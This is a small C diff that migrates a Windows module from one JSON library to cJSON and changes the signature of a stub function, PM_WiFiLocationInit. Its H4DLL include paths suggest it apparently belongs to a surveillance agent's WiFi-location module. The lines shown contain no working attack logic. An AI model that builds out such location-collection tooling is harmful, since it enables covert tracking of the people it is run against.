@@ -1,7 +1,7 @@
 #define _CRT_SECURE_NO_WARNINGS 1
 
 #include <Windows.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
 #include <time.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/H4-DLL.h"
@@ -144,7 +144,7 @@ DWORD WINAPI PM_WiFiLocationStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD WINAPI PM_WiFiLocationInit(JSONObject elem)
+DWORD WINAPI PM_WiFiLocationInit(cJSON *elem)
 {
 	return 1;
 }
